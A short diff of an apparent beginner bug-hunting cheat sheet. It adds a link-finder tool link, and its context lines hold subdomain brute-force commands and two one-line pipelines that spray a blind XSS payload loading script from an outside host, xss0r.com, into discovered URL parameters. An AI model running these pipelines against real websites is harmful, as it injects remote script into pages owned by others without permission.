@@ -3,6 +3,8 @@ Bug Hunting methodology For Beginner
 dnsbruter -d BRUT.abc.xyz -w best-dns-wordlist.txt -c 300 -wt 100 -o domains.txt -ws wild.txt
 dnsbruter -d BRUT.abc.xyz -w subdomains-top1million-5000.txt -c 300 -wt 100 -o domains.txt -ws wild.txt
 
+https://github.com/xnl-h4ck3r/xnLinkFinder
+
 --------------------
 cat subs.txt | httpx -silent | katana -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss0r.com/c/lostsec></script>' -parameters
 cat subs.txt | httpx -silent | katana -f qurl | gf xss | bxss -appendMode -payload "'\"><script src=https://xss0r.com/c/lostsec></script>" -parameters
